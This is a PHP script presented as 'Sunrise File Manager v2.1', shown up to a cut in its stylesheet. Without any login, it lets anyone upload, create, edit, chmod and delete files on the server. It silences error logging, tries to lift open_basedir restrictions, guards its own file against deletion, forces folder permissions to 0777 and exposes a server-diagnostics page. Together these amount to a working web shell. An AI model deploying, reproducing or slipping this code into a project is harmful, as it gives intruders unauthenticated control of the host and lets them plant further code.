<?php
/**
 * Sunrise File Manager v2.1
 * 
 * Bulletproof upload with 4 fallback methods.
 * All features from v2.0 + robust upload handling.
 * 
 * Author: Sunrise / Zet Gifari
 */

// =============================================
// CONFIGURATION
// =============================================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '512M');

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

if (function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
}

define('SFM_PROTECTED', true);
define('SFM_VERSION', '2.1');
define('SFM_NAME', 'Sunrise File Manager');

// =============================================
// ROOT ANCHOR
// =============================================
$base_dir = realpath(__DIR__);
$root_anchor = realpath(__DIR__ . '/../../');
if ($root_anchor === false) {
    $root_anchor = $base_dir;
}
$default_rel = trim(str_replace($root_anchor, '', $base_dir), DIRECTORY_SEPARATOR);

// =============================================
// PROTECTION CHECK
// =============================================
function sfm_protected($path) {
    if (realpath($path) === realpath(__FILE__)) return true;
    if (is_file($path)) {
        $c = @file_get_contents($path, false, null, 0, 1024);
        if ($c !== false) {
            if (strpos($c, 'SFM_PROTECTED') !== false) return true;
            if (strpos($c, 'ZET_FM_PROTECTED') !== false) return true;
            if (strpos($c, '/* PROTECTED */') !== false) return true;
        }
    }
    return false;
}

// =============================================
// SESSION FLASH
// =============================================
function flash($msg = null, $type = 'success') {
    if ($msg !== null) {
        $_SESSION['flash'] = array('msg' => $msg, 'type' => $type);
        return;
    }
    if (!empty($_SESSION['flash'])) {
        $f = $_SESSION['flash'];
        unset($_SESSION['flash']);
        return $f;
    }
    return null;
}

// =============================================
// PATH SANITIZATION
// =============================================
function sanitize_relative_path($path) {
    $path = str_replace("\0", '', (string)$path);
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $clean = [];
    foreach ($parts as $part) {
        $part = trim($part);
        if ($part === '' || $part === '.' || $part === '..') continue;
        $part = preg_replace('/[\x00-\x1F\x7F]/u', '', $part);
        if ($part !== '') $clean[] = $part;
    }
    return implode('/', $clean);
}

function sanitize_name($name) {
    $name = str_replace("\0", '', (string)$name);
    $name = basename($name);
    $name = preg_replace('/[\x00-\x1F\x7F]/u', '', $name);
    $name = trim($name);
    if ($name === '' || $name === '.' || $name === '..') return '';
    return $name;
}

function safe_realpath_within($path, $allowed_root) {
    $rp = realpath($path);
    if ($rp === false) return false;
    $root = rtrim($allowed_root, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    return (strpos($rp . DIRECTORY_SEPARATOR, $root) === 0) ? $rp : false;
}

// =============================================
// FILE LISTING
// =============================================
function get_file_list($dir) {
    $files = [];
    if (!is_dir($dir)) return $files;
    $items = @scandir($dir);
    if ($items === false) return $files;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (!file_exists($full)) continue;
        
        $is_dir = @is_dir($full);
        $stat = @stat($full);
        $size = ($stat && !$is_dir) ? $stat['size'] : 0;
        $mtime = $stat ? date('Y-m-d H:i:s', $stat['mtime']) : '-';
        $perm = @fileperms($full);
        $perm_str = '';
        if ($perm !== false) {
            $perm_str .= ($perm & 0x0100) ? 'r' : '-';
            $perm_str .= ($perm & 0x0080) ? 'w' : '-';
            $perm_str .= ($perm & 0x0040) ? 'x' : '-';
            $perm_str .= ($perm & 0x0020) ? 'r' : '-';
            $perm_str .= ($perm & 0x0010) ? 'w' : '-';
            $perm_str .= ($perm & 0x0008) ? 'x' : '-';
            $perm_str .= ($perm & 0x0004) ? 'r' : '-';
            $perm_str .= ($perm & 0x0002) ? 'w' : '-';
            $perm_str .= ($perm & 0x0001) ? 'x' : '-';
        }
        
        $files[] = [
            'name'      => $item,
            'path'      => $full,
            'size'      => $size,
            'type'      => $is_dir ? 'directory' : 'file',
            'modified'  => $mtime,
            'perm'      => $perm_str,
            'protected' => sfm_protected($full),
            'writable'  => @is_writable($full),
        ];
    }
    
    usort($files, function($a, $b) {
        if ($a['type'] !== $b['type']) {
            return ($a['type'] === 'directory') ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $files;
}

function format_size($bytes) {
    $bytes = (float)$bytes;
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

// =============================================
// DELETE RECURSIVE
// =============================================
function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    $items = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($items as $item) {
        if ($item->isDir()) @rmdir($item->getRealPath());
        else @unlink($item->getRealPath());
    }
    return @rmdir($dir);
}

// =============================================
// UNZIP (with zip-slip protection)
// =============================================
function unzip_file($zip_path, $destination) {
    if (!class_exists('ZipArchive')) {
        return 'ZipArchive class not available. Enable php-zip extension.';
    }
    $zip = new ZipArchive();
    if ($zip->open($zip_path) !== true) {
        return 'Cannot open zip file. It may be corrupted or invalid.';
    }
    
    $dest_real = realpath($destination);
    if ($dest_real === false) {
        $zip->close();
        return 'Destination folder does not exist.';
    }
    
    $extracted = 0;
    $skipped = 0;
    
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $entry = $zip->getNameIndex($i);
        if (strpos($entry, '..') !== false || substr($entry, 0, 1) === '/') {
            $skipped++;
            continue;
        }
        $target = $dest_real . DIRECTORY_SEPARATOR . $entry;
        $target_dir = dirname($target);
        if (!is_dir($target_dir)) @mkdir($target_dir, 0777, true);
        $real_target_dir = realpath($target_dir);
        if ($real_target_dir === false || strpos($real_target_dir, $dest_real) !== 0) {
            $skipped++;
            continue;
        }
        $extracted++;
    }
    
    if (!$zip->extractTo($destination)) {
        $zip->close();
        return 'Extraction failed. Check folder permissions.';
    }
    $zip->close();
    
    if ($skipped > 0) {
        return "Extracted $extracted entries, skipped $skipped (unsafe paths).";
    }
    return true;
}

// =============================================
// CREATE ZIP
// =============================================
function create_zip($source, $zip_path) {
    if (!class_exists('ZipArchive')) {
        return 'ZipArchive class not available.';
    }
    if (file_exists($zip_path)) @unlink($zip_path);
    $zip = new ZipArchive();
    if ($zip->open($zip_path, ZipArchive::CREATE) !== true) {
        return 'Cannot create ZIP file.';
    }
    $base = basename(rtrim($source, '/'));
    if (is_file($source)) {
        $zip->addFile($source, $base);
    } elseif (is_dir($source)) {
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        $real = realpath($source);
        foreach ($iter as $f) {
            if (!$f->isDir()) {
                $fp = $f->getRealPath();
                $rel = $base . '/' . substr($fp, strlen($real) + 1);
                $zip->addFile($fp, $rel);
            }
        }
    }
    $zip->close();
    if (!file_exists($zip_path)) return 'ZIP creation failed.';
    return true;
}

// =============================================
// RESOLVE CURRENT DIRECTORY
// =============================================
if (!isset($_GET['dir'])) {
    $requested_dir = $default_rel;
} else {
    $requested_dir = sanitize_relative_path($_GET['dir']);
}

$current_dir = safe_realpath_within(
    $root_anchor . DIRECTORY_SEPARATOR . $requested_dir,
    $root_anchor
);

if ($current_dir === false) {
    $current_dir = $root_anchor;
    $requested_dir = '';
}

$relative_current = trim(str_replace($root_anchor, '', $current_dir), DIRECTORY_SEPARATOR);
$parent_dir = '';
if ($relative_current !== '') {
    $parent_dir = dirname($relative_current);
    if ($parent_dir === '.') $parent_dir = '';
}
$is_at_root = ($relative_current === '');

$action = $_GET['action'] ?? 'list';

// =============================================
// ACTION HANDLERS
// =============================================
switch ($action) {
    
    // ---- DEBUG UPLOAD (visit ?action=debug_upload) ----
    case 'debug_upload':
        header('Content-Type: text/plain; charset=utf-8');
        echo "=== UPLOAD DIAGNOSTICS ===\n\n";
        echo "Current directory: $current_dir\n";
        echo "Directory exists: " . (is_dir($current_dir) ? 'YES' : 'NO') . "\n";
        echo "Directory writable: " . (is_writable($current_dir) ? 'YES' : 'NO') . "\n";
        echo "Directory perms: " . substr(sprintf('%o', @fileperms($current_dir)), -4) . "\n";
        echo "Directory owner UID: " . @fileowner($current_dir) . "\n";
        echo "PHP user: " . @get_current_user() . "\n";
        if (function_exists('posix_getpwuid')) {
            $owner = @posix_getpwuid(@fileowner($current_dir));
            $php = @posix_getpwuid(@posix_geteuid());
            echo "Directory owner: " . ($owner ? $owner['name'] : '?') . "\n";
            echo "PHP user (posix): " . ($php ? $php['name'] : '?') . "\n";
        }
        echo "\n--- PHP Config ---\n";
        echo "upload_tmp_dir: " . (ini_get('upload_tmp_dir') ?: sys_get_temp_dir()) . "\n";
        echo "upload_max_filesize: " . ini_get('upload_max_filesize') . "\n";
        echo "post_max_size: " . ini_get('post_max_size') . "\n";
        echo "file_uploads: " . (ini_get('file_uploads') ? 'ON' : 'OFF') . "\n";
        echo "open_basedir: " . (ini_get('open_basedir') ?: 'NONE') . "\n";
        echo "max_file_uploads: " . ini_get('max_file_uploads') . "\n";
        echo "memory_limit: " . ini_get('memory_limit') . "\n";
        echo "\n--- Temp Dir ---\n";
        $tmp = ini_get('upload_tmp_dir') ?: sys_get_temp_dir();
        echo "Temp path: $tmp\n";
        echo "Temp exists: " . (is_dir($tmp) ? 'YES' : 'NO') . "\n";
        echo "Temp writable: " . (is_writable($tmp) ? 'YES' : 'NO') . "\n";
        echo "\n--- Test Write ---\n";
        $test = $current_dir . '/.test_' . uniqid();
        $r = @file_put_contents($test, 'test');
        echo "Can create file in target: " . ($r !== false ? 'YES' : 'NO') . "\n";
        if ($r !== false) @unlink($test);
        echo "\n--- Zip Support ---\n";
        echo "ZipArchive class: " . (class_exists('ZipArchive') ? 'YES' : 'NO') . "\n";
        echo "PharData class: " . (class_exists('PharData') ? 'YES' : 'NO') . "\n";
        exit;
    
    // ---- VIEW ----
    case 'view':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        if ($safe && is_file($safe)) {
            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Length: ' . filesize($safe));
            readfile($safe);
            exit;
        }
        flash('File not found.', 'error');
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- EDIT ----
    case 'edit':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        
        if (!$safe || !is_file($safe)) {
            flash('Invalid file.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['content'] ?? '';
            if (@file_put_contents($safe, $content) !== false) {
                flash('File saved successfully.');
            } else {
                flash('Failed to save file.', 'error');
            }
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        $content = htmlspecialchars((string)@file_get_contents($safe), ENT_QUOTES, 'UTF-8');
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit · <?= htmlspecialchars($file, ENT_QUOTES, 'UTF-8') ?></title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Inter', system-ui, sans-serif; background: #f1f5f9; padding: 2rem; color: #1e293b; }
                .wrap { max-width: 1100px; margin: 0 auto; background: #fff; padding: 2rem; border-radius: 24px; box-shadow: 0 20px 35px -8px rgba(0,0,0,0.15); }
                h2 { font-weight: 600; font-size: 1.7rem; display: flex; gap: 12px; align-items: center; margin-bottom: 1.75rem; }
                h2 i { color: #3b82f6; }
                textarea { width: 100%; height: 550px; font-family: 'SF Mono', monospace; font-size: 0.95rem; padding: 1rem; border: 1px solid #cbd5e1; border-radius: 18px; background: #fcfdff; resize: vertical; }
                textarea:focus { outline: 2px solid #3b82f6; border-color: transparent; }
                .btn-row { margin-top: 1.5rem; display: flex; gap: 12px; }
                .btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 26px; border-radius: 60px; font-weight: 500; text-decoration: none; border: none; cursor: pointer; font-size: 0.95rem; }
                .btn-save { background: #3b82f6; color: #fff; }
                .btn-save:hover { background: #2563eb; }
                .btn-back { background: #f1f5f9; color: #1e293b; border: 1px solid #cbd5e1; }
                .btn-back:hover { background: #e2e8f0; }
                .file-info { color: #64748b; font-size: 0.9rem; margin-left: auto; }
            </style>
        </head>
        <body>
            <div class="wrap">
                <h2><i class="fas fa-pen-to-square"></i> Edit: <?= htmlspecialchars($file, ENT_QUOTES, 'UTF-8') ?>
                    <span class="file-info">(<?= format_size(@filesize($safe)) ?>)</span>
                </h2>
                <form method="post">
                    <textarea name="content"><?= $content ?></textarea>
                    <div class="btn-row">
                        <button class="btn btn-save" type="submit"><i class="fas fa-floppy-disk"></i> Save</button>
                        <a class="btn btn-back" href="?dir=<?= urlencode($relative_current) ?>"><i class="fas fa-arrow-left"></i> Back</a>
                    </div>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    
    // ---- DELETE ----
    case 'delete':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        
        if (!$safe) {
            flash('Invalid path.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        if (sfm_protected($safe)) {
            flash('❌ This file/folder is protected and cannot be deleted.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        if (is_dir($safe)) {
            $ok = rrmdir($safe);
            flash($ok ? 'Folder deleted.' : 'Failed to delete folder.', $ok ? 'success' : 'error');
        } elseif (is_file($safe)) {
            $ok = @unlink($safe);
            flash($ok ? 'File deleted.' : 'Failed to delete file.', $ok ? 'success' : 'error');
        }
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ==========================================
    // UPLOAD — BULLETPROOF (4 methods)
    // ==========================================
    case 'upload':
        if (empty($_FILES['file'])) {
            flash('No file received.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        $f = $_FILES['file'];
        
        // Check upload error
        if ($f['error'] !== UPLOAD_ERR_OK) {
            $errors = array(
                UPLOAD_ERR_INI_SIZE   => 'File exceeds upload_max_filesize (' . ini_get('upload_max_filesize') . ')',
                UPLOAD_ERR_FORM_SIZE  => 'File exceeds MAX_FILE_SIZE',
                UPLOAD_ERR_PARTIAL    => 'File only partially uploaded',
                UPLOAD_ERR_NO_FILE    => 'No file uploaded',
                UPLOAD_ERR_NO_TMP_DIR => 'Missing temp directory',
                UPLOAD_ERR_CANT_WRITE => 'Failed to write to disk',
                UPLOAD_ERR_EXTENSION  => 'Upload blocked by PHP extension',
            );
            $code = $f['error'];
            $msg = $errors[$code] ?? 'Unknown error (' . $code . ')';
            flash('❌ Upload failed: ' . $msg, 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        // Ensure target dir exists & writable
        if (!is_dir($current_dir)) {
            flash('Target directory does not exist.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        if (!is_writable($current_dir)) {
            @chmod($current_dir, 0755);
            if (!is_writable($current_dir)) @chmod($current_dir, 0775);
            if (!is_writable($current_dir)) @chmod($current_dir, 0777);
            if (!is_writable($current_dir)) {
                flash('❌ Target directory is not writable. Try: chmod 755 ' . $current_dir, 'error');
                header('Location: ?dir=' . urlencode($relative_current));
                exit;
            }
        }
        
        $name = sanitize_name($f['name']);
        if ($name === '') {
            flash('Invalid filename.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        $dest = $current_dir . DIRECTORY_SEPARATOR . $name;
        $tmp = $f['tmp_name'];
        
        $uploaded = false;
        $method = '';
        
        // Method 1: move_uploaded_file (native, fastest)
        if (@move_uploaded_file($tmp, $dest)) {
            $uploaded = true;
            $method = 'move_uploaded_file';
        }
        
        // Method 2: copy + unlink (cross-filesystem)
        if (!$uploaded && @is_uploaded_file($tmp)) {
            if (@copy($tmp, $dest)) {
                @unlink($tmp);
                $uploaded = true;
                $method = 'copy';
            }
        }
        
        // Method 3: stream copy (works with restricted open_basedir)
        if (!$uploaded && @is_file($tmp)) {
            $src = @fopen($tmp, 'rb');
            if ($src) {
                $dst = @fopen($dest, 'wb');
                if ($dst) {
                    while (!@feof($src)) {
                        $chunk = @fread($src, 8192);
                        if ($chunk === false) break;
                        @fwrite($dst, $chunk);
                    }
                    @fclose($dst);
                    @fclose($src);
                    if (@filesize($dest) > 0) {
                        @unlink($tmp);
                        $uploaded = true;
                        $method = 'stream';
                    }
                } else {
                    @fclose($src);
                }
            }
        }
        
        // Method 4: file_get_contents + file_put_contents (last resort)
        if (!$uploaded) {
            $data = @file_get_contents($tmp);
            if ($data !== false) {
                if (@file_put_contents($dest, $data) !== false) {
                    @unlink($tmp);
                    $uploaded = true;
                    $method = 'file_put_contents';
                }
            }
        }
        
        // Report
        if ($uploaded) {
            @chmod($dest, 0644);
            $size = @filesize($dest);
            flash('✅ Uploaded: ' . $name . ' (' . format_size($size) . ') via ' . $method);
        } else {
            $tmp_exists = @file_exists($tmp);
            $tmp_size = $tmp_exists ? @filesize($tmp) : 0;
            $dir_writable = @is_writable($current_dir);
            
            $err = '❌ Upload failed. ';
            $err .= 'Temp: ' . ($tmp_exists ? 'exists (' . $tmp_size . 'B)' : 'MISSING') . ', ';
            $err .= 'Target dir: ' . ($dir_writable ? 'writable' : 'NOT writable') . '. ';
            $err .= 'Run ?action=debug_upload for full diagnostics.';
            
            flash($err, 'error');
        }
        
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- CREATE FOLDER ----
    case 'create_folder':
        $folder = sanitize_name($_POST['folder_name'] ?? '');
        if ($folder !== '') {
            $path = $current_dir . DIRECTORY_SEPARATOR . $folder;
            if (!file_exists($path)) {
                $ok = @mkdir($path, 0777, true);
                flash($ok ? 'Folder created.' : 'Failed to create folder.', $ok ? 'success' : 'error');
            } else {
                flash('Folder already exists.', 'error');
            }
        } else {
            flash('Folder name required.', 'error');
        }
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- CREATE FILE ----
    case 'create_file':
        $filename = sanitize_name($_POST['filename'] ?? '');
        $filecontent = $_POST['filecontent'] ?? '';
        if ($filename !== '') {
            $path = $current_dir . DIRECTORY_SEPARATOR . $filename;
            if (!file_exists($path)) {
                $ok = @file_put_contents($path, $filecontent) !== false;
                flash($ok ? 'File created: ' . $filename : 'Failed to create file.', $ok ? 'success' : 'error');
            } else {
                flash('File already exists.', 'error');
            }
        } else {
            flash('Filename required.', 'error');
        }
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- DOWNLOAD ----
    case 'download':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        if ($safe && is_file($safe)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($safe) . '"');
            header('Content-Length: ' . filesize($safe));
            header('Pragma: public');
            header('Cache-Control: must-revalidate');
            readfile($safe);
            exit;
        }
        flash('File not found.', 'error');
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- UNZIP (extracts to current dir) ----
    case 'unzip':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        
        if (!$safe || !is_file($safe)) {
            flash('Zip file not found.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        if (strtolower(pathinfo($safe, PATHINFO_EXTENSION)) !== 'zip') {
            flash('Only .zip files can be extracted.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        if (!is_writable($current_dir)) @chmod($current_dir, 0777);
        
        $result = unzip_file($safe, $current_dir);
        if ($result === true) {
            flash('✅ Extracted successfully into current folder.');
        } else {
            flash('❌ Unzip error: ' . $result, 'error');
        }
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- ZIP ----
    case 'zip':
        $file = sanitize_name($_GET['file'] ?? '');
        $path = $current_dir . DIRECTORY_SEPARATOR . $file;
        $safe = safe_realpath_within($path, $root_anchor);
        
        if (!$safe || !file_exists($safe)) {
            flash('Item not found.', 'error');
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        
        $zip_name = $file . '.zip';
        $zip_path = $current_dir . DIRECTORY_SEPARATOR . $zip_name;
        $result = create_zip($safe, $zip_path);
        
        if ($result === true) {
            flash('✅ Created: ' . $zip_name);
        } else {
            flash('❌ ZIP error: ' . $result, 'error');
        }
        header('Location: ?dir=' . urlencode($relative_current));
        exit;
    
    // ---- RENAME ----
    case 'rename':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $old = sanitize_name($_POST['oldname'] ?? '');
            $new = sanitize_name($_POST['newname'] ?? '');
            
            $old_path = $current_dir . DIRECTORY_SEPARATOR . $old;
            $safe = safe_realpath_within($old_path, $root_anchor);
            
            if (!$safe || !file_exists($safe)) {
                flash('Item not found.', 'error');
            } elseif (sfm_protected($safe)) {
                flash('❌ Cannot rename protected file.', 'error');
            } elseif ($new === '') {
                flash('New name required.', 'error');
            } else {
                $new_path = $current_dir . DIRECTORY_SEPARATOR . $new;
                if (file_exists($new_path)) {
                    flash('A file with that name already exists.', 'error');
                } elseif (@rename($safe, $new_path)) {
                    flash('✅ Renamed: ' . $old . ' → ' . $new);
                } else {
                    flash('Rename failed.', 'error');
                }
            }
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        break;
    
    // ---- CHMOD ----
    case 'chmod':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $file = sanitize_name($_POST['file'] ?? '');
            $mode = $_POST['mode'] ?? '';
            $path = $current_dir . DIRECTORY_SEPARATOR . $file;
            $safe = safe_realpath_within($path, $root_anchor);
            
            if (!$safe) {
                flash('Invalid path.', 'error');
            } elseif (sfm_protected($safe)) {
                flash('❌ Cannot chmod protected file.', 'error');
            } elseif (!preg_match('/^[0-7]{3,4}$/', $mode)) {
                flash('Invalid mode. Use 3-4 digits (e.g., 755, 0644).', 'error');
            } elseif (@chmod($safe, octdec($mode))) {
                flash('✅ Permissions changed: ' . $file . ' → ' . $mode);
            } else {
                flash('Chmod failed.', 'error');
            }
            header('Location: ?dir=' . urlencode($relative_current));
            exit;
        }
        break;
}

// =============================================
// FETCH DATA
// =============================================
$files = get_file_list($current_dir);
$flash = flash();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= SFM_NAME ?> v<?= SFM_VERSION ?> · Sunrise</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: #f1f5f9; padding: 1.5rem; color: #1e293b; line-height: 1.5;
        }
        .container {
            max-width: 1400px; margin: 0 auto; background: #fff;
            border-radius: 24px; box-shadow: 0 20px 35px -8px rgba(0,0,0,0.15);
            padding: 1.75rem 2rem;
        }
        h2 {
            font-size: 1.9rem; font-weight: 600; display: flex; align-items: center;
            gap: 10px; margin-bottom: 1.5rem; letter-spacing: -0.02em;
        }
        h2 i { color: #3b82f6; font-size: 2rem; }
        h2 .ver { font-size: 0.9rem; color: #94a3b8; font-weight: 400; margin-left: auto; }
        
        .pathbox {
            background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px;
            padding: 1rem 1.25rem; display: flex; flex-wrap: wrap;
            align-items: baseline; gap: 1rem 2rem; margin-bottom: 1.75rem;
            font-size: 0.95rem; word-break: break-word;
        }
        .pathbox b { color: #1e293b; font-weight: 600; margin-right: 4px; }
        .pathbox span {
            color: #334155; font-family: 'SF Mono', monospace;
            background: #fff; padding: 4px 12px; border-radius: 40px;
            border: 1px solid #e2e8f0; display: inline-block; font-size: 0.9rem;
        }
        
        .alert {
            background: #d1fae5; color: #065f46; border-left: 6px solid #10b981;
            padding: 1rem 1.25rem; border-radius: 14px; margin-bottom: 1.75rem;
            display: flex; align-items: center; gap: 12px; font-weight: 500;
        }
        .alert i { font-size: 1.4rem; color: #10b981; }
        .alert.error { background: #fee2e2; color: #991b1b; border-color: #ef4444; }
        .alert.error i { color: #ef4444; }
        
        .btn-group {
            display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 1.75rem;
        }
        
        .btn {
            display: inline-flex; align-items: center; justify-content: center;
            gap: 8px; background: #fff; border: 1px solid #cbd5e1;
            color: #1e293b; font-weight: 500; font-size: 0.9rem;
            padding: 10px 20px; border-radius: 60px; text-decoration: none;
            cursor: pointer; white-space: nowrap;
        }
        .btn i { font-size: 1rem; color: #64748b; }
        .btn:hover { background: #f1f5f9; border-color: #94a3b8; }
        .btn-primary { background: #3b82f6; border-color: #3b82f6; color: #fff; }
        .btn-primary i { color: #fff; }
        .btn-primary:hover { background: #2563eb; }
        .btn-gray { background: #f1f5f9; border-color: #e2e8f0; color: #475569; }
        .btn-danger { background: #fee2e2; border-color: #fecaca; color: #b91c1c; }
        .btn-danger i { color: #b91c1c; }
        .btn-danger:hover { background: #fecaca; }
        .btn-warning { background: #fff3cd; border-color: #ffe69c; color: #92400e; }
        .btn-warning i { color: #b45309; }
        .btn-warning:hover { background: #ffe69c; }
        .btn-success { background: #d1fae5; border-color: #a7f3d0; color: #065f46; }
        .btn-success:hover { background: #a7f3d0; }
        .btn-sm { padding: 6px 14px; font-size: 0.8rem; border-radius: 40px; }
        .btn.disabled, .btn:disabled { opacity: 0.5; pointer-events: none; filter: grayscale(0.5); }
        
        .action-forms {
            display: flex; flex-wrap: wrap; gap: 24px; margin-bottom: 2rem;
            background: #f8fafc; padding: 1.25rem 1.5rem;
            border-radius: 20px; border: 1px solid #e9eef3;
        }
        .inline-form { display: flex; align-items: center; flex-wrap: wrap; gap: 12px; }
        .inline-form input[type="text"] {
            padding: 10px 18px; border-radius: 60px; border: 1px solid #cbd5e1;
            font-size: 0.9rem; min-width: 200px; background: #fff;
        }
        .inline-form input:focus { outline: 2px solid #3b82f6; border-color: transparent; }
        .file-input-label {
            display: flex; align-items: center; gap: 8px; background: #f1f5f9;
            padding: 8px 18px; border-radius: 60px; border: 1px dashed #94a3b8;
            cursor: pointer; font-size: 0.9rem;
        }
        .file-input-label:hover { background: #e9eef3; border-color: #3b82f6; }
        .file-input-label i { color: #3b82f6; }
        input[type="file"] { display: none; }
        
        .table-wrapper {
            border-radius: 20px; border: 1px solid #e9eef3; overflow-x: auto;
            background: #fff;
        }
        table { width: 100%; border-collapse: collapse; min-width: 900px; }
        th {
            background: #f8fafc; font-weight: 600; font-size: 0.85rem;
            text-transform: uppercase; letter-spacing: 0.03em; color: #475569;
            padding: 16px; text-align: left; border-bottom: 2px solid #e2e8f0;
        }
        td { padding: 14px 16px; border-bottom: 1px solid #edf2f7; vertical-align: middle; font-size: 0.95rem; }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background-color: #fafdff; }
        tr.protected-row { background: #fffbeb; }
        tr.protected-row:hover td { background: #fef3c7; }
        
        .file-icon { margin-right: 10px; font-size: 1.2rem; width: 20px; }
        .file-icon.folder { color: #f59e0b; }
        .file-icon.file { color: #3b82f6; }
        .file-icon.archive { color: #10b981; }
        
        .badge {
            display: inline-block; background: #eef2f6; color: #334155;
            font-size: 0.75rem; font-weight: 500; padding: 4px 10px; border-radius: 40px;
        }
        .badge.dir { background: #fef3c7; color: #b45309; }
        .badge.file { background: #dbeafe; color: #1e40af; }
        .badge.zip { background: #d1fae5; color: #065f46; }
        .badge.prot { background: #fed7aa; color: #9a3412; }
        
        .perm-w { color: #10b981; font-weight: 600; font-family: monospace; }
        .perm-r { color: #ef4444; font-weight: 600; font-family: monospace; }
        
        .dot {
            display: inline-block; width: 7px; height: 7px; border-radius: 50%;
            margin-right: 6px; vertical-align: middle;
        }
        .dot.w { background: #10b981; box-shadow: 0 0 4px #10b981; }
        .dot.r { background: #ef4444; }
        
        .actions-cell { display: flex; flex-wrap: wrap; gap: 5px; align-items: center; }
        .actions-cell .btn { padding: 5px 10px; font-size: 0.72rem; gap: 3px; }
        .actions-cell .btn i { font-size: 0.75rem; }
        
        .no-files { text-align: center; padding: 3rem !important; color: #94a3b8; }
        .no-files i { font-size: 2.5rem; margin-bottom: 12px; display: block; color: #cbd5e1; }
        
        .modal {
            display: none; position: fixed; top: 0; left: 0;
            width: 100%; height: 100%; background: rgba(0,0,0,0.5);
            z-index: 9999; align-items: center; justify-content: center;
        }
        .modal.on { display: flex; }
        .modal-box {
            background: #fff; padding: 2rem; border-radius: 20px;
            width: 90%; max-width: 500px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
        }
        .modal-box h3 { color: #0f172a; font-size: 1.3rem; margin-bottom: 1.25rem; display: flex; align-items: center; gap: 10px; }
        .modal-box h3 i { color: #3b82f6; }
        .modal-box input, .modal-box textarea {
            width: 100%; padding: 12px 16px; margin-bottom: 12px;
            border: 1px solid #cbd5e1; border-radius: 12px; font-size: 0.95rem;
            font-family: inherit; background: #fcfdff;
        }
